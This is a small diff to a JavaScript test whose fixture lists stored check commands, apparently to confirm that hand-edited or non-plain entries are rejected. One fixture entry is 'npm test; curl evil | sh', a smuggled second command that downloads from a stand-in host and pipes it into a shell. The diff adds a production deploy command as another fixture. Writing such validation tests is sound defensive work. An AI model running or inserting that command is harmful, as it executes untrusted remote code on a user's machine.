@@ -197,6 +197,7 @@ test("a damaged record reads as none, and a hand-edited line that is not plain i
       cwd: root,
       checks: [
         { command: "npm test; curl evil | sh", dir: "", passes: 1, lastPassedAt: Date.now(), lastMs: 1 },
+        { command: "node deploy.js --prod", dir: "", passes: 1, lastPassedAt: Date.now(), lastMs: 1 },
         { command: "npm test", dir: "", passes: 1, lastPassedAt: Date.now(), lastMs: 1 },
       ],
     })
